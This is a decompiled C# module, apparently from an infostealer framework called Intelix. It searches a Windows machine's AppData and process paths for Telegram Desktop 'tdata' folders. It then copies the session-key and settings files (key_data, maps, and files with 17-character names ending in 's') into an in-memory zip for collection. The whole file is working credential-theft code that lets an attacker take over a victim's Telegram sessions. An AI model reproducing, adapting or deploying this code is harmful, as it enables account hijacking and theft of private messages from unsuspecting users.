using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using Intelix.Helper;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers
{
	// Token: 0x02000020 RID: 32
	public class Telegram : ITarget
	{
		// Token: 0x0600005F RID: 95 RVA: 0x00004838 File Offset: 0x00002A38
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Telegram";
			Parallel.ForEach<string>(this.FindAllMatches("tdata"), delegate(string tdata)
			{
				string targetPath = Path.GetFileName(tdata.Remove(tdata.Length - 6, 6)) + RandomStrings.GenerateHashTag();
				this.Copydata(tdata, targetPath, zip, counterApplications);
			});
			bool flag = counterApplications.Files.Count > 0;
			if (flag)
			{
				counter.Messangers.Add(counterApplications);
			}
		}

		// Token: 0x06000060 RID: 96 RVA: 0x000048C0 File Offset: 0x00002AC0
		private void AddIfMatch(FileInfo fileInfo, string entryPath, InMemoryZip zip)
		{
			string name = fileInfo.Name;
			bool flag = name.EndsWith("s") && name.Length == 17;
			if (flag)
			{
				zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
			}
			else
			{
				bool flag2 = name.StartsWith("usertag") || name.StartsWith("settings") || name.StartsWith("key_data") || name.StartsWith("configs") || name.StartsWith("maps");
				if (flag2)
				{
					zip.AddFile(entryPath, File.ReadAllBytes(fileInfo.FullName));
				}
			}
		}

		// Token: 0x06000061 RID: 97 RVA: 0x00004968 File Offset: 0x00002B68
		private void Copydata(string sourceDir, string targetPath, InMemoryZip zip, Counter.CounterApplications counterApplications)
		{
			ConcurrentBag<string> matchedNames = new ConcurrentBag<string>();
			bool addedAny = false;
			Parallel.ForEach<string>(Directory.GetFiles(sourceDir), delegate(string filePath)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(filePath);
					bool flag = fileInfo.Length <= 7120L;
					if (flag)
					{
						string entryPath = targetPath + "\\" + fileInfo.Name;
						bool flag2 = fileInfo.Name.EndsWith("s") && fileInfo.Name.Length == 17;
						if (flag2)
						{
							matchedNames.Add(fileInfo.Name);
						}
						int count = counterApplications.Files.Count;
						this.AddIfMatch(fileInfo, entryPath, zip);
						bool flag3 = (fileInfo.Name.EndsWith("s") && fileInfo.Name.Length == 17) || fileInfo.Name.StartsWith("usertag") || fileInfo.Name.StartsWith("settings") || fileInfo.Name.StartsWith("key_data") || fileInfo.Name.StartsWith("configs") || fileInfo.Name.StartsWith("maps");
						if (flag3)
						{
							addedAny = true;
						}
					}
				}
				catch
				{
				}
			});
			Parallel.ForEach<string>(matchedNames, delegate(string name)
			{
				try
				{
					string dirPath = Path.Combine(sourceDir, name);
					dirPath = dirPath.Remove(dirPath.Length - 1);
					bool flag = Directory.Exists(dirPath);
					if (flag)
					{
						Parallel.ForEach<string>(Directory.GetFiles(dirPath), delegate(string filePath)
						{
							try
							{
								FileInfo fileInfo = new FileInfo(filePath);
								bool flag2 = fileInfo.Length <= 7120L;
								if (flag2)
								{
									string entryPath = string.Concat(new string[]
									{
										targetPath,
										"\\",
										Path.GetFileName(dirPath),
										"\\",
										fileInfo.Name
									});
									this.AddIfMatch(fileInfo, entryPath, zip);
									bool flag3 = (fileInfo.Name.EndsWith("s") && fileInfo.Name.Length == 17) || fileInfo.Name.StartsWith("usertag") || fileInfo.Name.StartsWith("settings") || fileInfo.Name.StartsWith("key_data") || fileInfo.Name.StartsWith("configs") || fileInfo.Name.StartsWith("maps");
									if (flag3)
									{
										addedAny = true;
									}
								}
							}
							catch
							{
							}
						});
					}
				}
				catch
				{
				}
			});
			bool addedAny2 = addedAny;
			if (addedAny2)
			{
				counterApplications.Files.Add(sourceDir + " => " + targetPath);
			}
		}

		// Token: 0x06000062 RID: 98 RVA: 0x00004A1C File Offset: 0x00002C1C
		private List<string> FindInAppData(string folderName)
		{
			bool flag = string.IsNullOrEmpty(folderName);
			List<string> result;
			if (flag)
			{
				result = new List<string>();
			}
			else
			{
				ConcurrentDictionary<string, byte> found = new ConcurrentDictionary<string, byte>(StringComparer.OrdinalIgnoreCase);
				string[] array = new string[]
				{
					Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
					Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
				};
				foreach (string text in array)
				{
					bool flag2 = string.IsNullOrEmpty(text) || !Directory.Exists(text);
					if (!flag2)
					{
						try
						{
							IEnumerable<string> source = Directory.EnumerateDirectories(text, "*", SearchOption.TopDirectoryOnly);
							Parallel.ForEach<string>(source, delegate(string dir1)
							{
								try
								{
									string path = Path.Combine(dir1, folderName);
									bool flag3 = Directory.Exists(path);
									if (flag3)
									{
										found.TryAdd(Path.GetFullPath(path), 0);
									}
								}
								catch
								{
								}
							});
						}
						catch
						{
						}
					}
				}
				result = new List<string>(found.Keys);
			}
			return result;
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00004B20 File Offset: 0x00002D20
		private List<string> FindAllMatches(string folderName)
		{
			ConcurrentDictionary<string, byte> set = new ConcurrentDictionary<string, byte>(StringComparer.OrdinalIgnoreCase);
			Parallel.ForEach<string>(ProcessWindows.FindFolder(folderName), delegate(string p)
			{
				set.TryAdd(p, 0);
			});
			Parallel.ForEach<string>(this.FindInAppData(folderName), delegate(string p)
			{
				set.TryAdd(p, 0);
			});
			return new List<string>(set.Keys);
		}
	}
}
